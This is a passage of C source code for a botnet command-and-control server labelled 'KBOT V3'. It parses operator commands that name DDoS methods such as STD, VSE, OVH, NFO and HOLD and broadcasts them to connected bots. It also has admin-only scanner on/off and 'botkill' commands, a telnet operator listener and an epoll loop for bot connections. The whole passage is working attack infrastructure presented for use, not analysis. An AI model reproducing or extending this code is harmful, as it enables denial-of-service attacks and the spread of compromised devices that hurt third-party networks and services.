                sprintf(botnet, "\x1b[37;1mHTTTP-BOTH attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "STD"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mSTD attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "STDHEX"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mSTDHEX attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "VSE"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mVSE attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "RAND"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mRAND attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "HOLD"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mHOLD attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "OVH"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mOVH attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "NFO"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mNFO attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
        else if(strstr(buf, "VPN"))
        {
            if(strlen(buf) > 17)
            {
               
                
                sprintf(botnet, "\x1b[37;1mVPN attacking with \x1b[38;5;45m%d \x1b[37;1mbots\x1b[38;5;45m!\r\n", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
            }
        }
		else if(strstr(buf, "STOP"))
		{
			sprintf(botnet, "\x1b[37;1mstopping attacks\x1b[38;5;45m!\r\n");
		  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		    broadcast(buf, thefd, usernamez);
		    memset(buf, 0, 2048);
		}
		else if(strstr(buf, "scanner on"))
		{
			if(!strcmp(accounts[find_line].priv, "Admin"))
			{
				sprintf(botnet, "\x1b[37;1mstarting scanner\x1b[38;5;45m!\r\n");
		  		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  		broadcast(buf, thefd, usernamez);
            	memset(buf, 0, 2048);
            }
         	else
			{
				failed(thefd);
			}   
		}
		else if(strstr(buf, "scanner off"))
        {
        	if(!strcmp(accounts[find_line].priv, "Admin"))
			{
            	sprintf(botnet, "\x1b[37;1mstopping scanner\x1b[38;5;45m!\r\n");
            	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	        	broadcast(buf, thefd, usernamez);
            	memset(buf, 0, 2048);
            }
            else
			{
				failed(thefd);
			}
        }
        else if(strstr(buf, "scanner"))
        {
        	if(!strcmp(accounts[find_line].priv, "Admin"))
			{
	            sprintf(botnet, "\x1b[37;1mscanner on\x1b[38;5;45m/\x1b[37;1moff\x1b[38;5;45m!\r\n");
	            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	        }
	        else
			{
				failed(thefd);
			}
        }
		else if(strstr(buf, "botkill"))
		{
			if(!strcmp(accounts[find_line].priv, "Admin"))
			{
				sprintf(botnet, "\x1b[37;1mkilling known pids\x1b[38;5;45m!\r\n");
			  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			    broadcast(buf, thefd, usernamez);
			    memset(buf, 0, 2048);
			}
			else
			{
				failed(thefd);
			}
		}   	
		else if (strlen(buf) >2)
		{
			trim(buf);
			char die[200];
			sprintf(die,"\x1b[37;1m%s\x1b[38;5;45m: \x1b[37;1mapplet not found\r\n", buf);
			if(send(thefd, die, strlen(die), MSG_NOSIGNAL) == -1) goto end;
		}
		if(send(thefd, bashline, strlen(bashline), MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof buf);
	}
	end:    
	managements[thefd].connected = 0;
	if(managements[thefd].connected == 0)
	managesConnected--;
	if(managesConnected<=-1)managesConnected=0;		
	managements[thefd].admin = 0;
	memset(managements[thefd].user,0,sizeof managements[thefd].user);
	close(thefd);
}

void *telnetListener(int port)
{    
    int sockfd, newsockfd;
    socklen_t clilen;
	int ye = 1;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &ye, sizeof(int)) < 0)// so we can keep using same port if its in TIME_WAIT state.
    printf("setsockopt failed\n");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1)
    {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if(newsockfd < 0) perror("ERROR on accept");	
		struct iplogger kbot;
		kbot.socket = newsockfd;
        pthread_t thread;
    	pthread_create(&thread, NULL, main_cnc_loop, (void *)&kbot);
	}
}
 
int main(int argc, char *argv[], void *sock)
{
    
    signal(SIGPIPE, SIG_IGN);
    int s, threads, port, parent;
	//
	//parent = fork();
    if(argc < 4)
    {
        printf("USAGE: %s BOTPORT THREADS CNCPORT", argv[0]);
    }
	printf("\e[1;1H\e[2J");
    struct epoll_event event;
	printf("\x1b[37;1m[\x1b[38;5;45mKBOT V3\x1b[37;1m] \x1b[37;1mcnc successfully started\x1b[38;5;45m!\x1b[0m\n");
    threads = atoi(argv[2]);
    port = atoi(argv[3]);
    bot_port = argv[1];

    listenFD = connection_setup(bot_port);
    if (listenFD == -1) abort ();
    s = make_socket_non_blocking(listenFD); 
    if (s == -1) abort ();
    s = listen(listenFD, SOMAXCONN); 
    if (s == -1)
    {
        perror ("listen");
        abort ();
    }
    epollFD = epoll_create1 (0); 
    if (epollFD == -1)
    {
        perror ("epoll_create");
        abort ();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1)
    {
        perror ("epoll_ctl");
        abort ();
    }
    pthread_t thread[threads + 2];
    while(threads--)
    {
     	pthread_create(&thread[threads + 2], NULL, &epollEventLoop, (void *) NULL);
    }
    pthread_create(&thread[0], NULL, telnetListener, port);
	while(1)
    {
        broadcast("PING\r\n", -1, "KBOT");
        sleep(60);
    }
    close (listenFD);
    return EXIT_SUCCESS;
}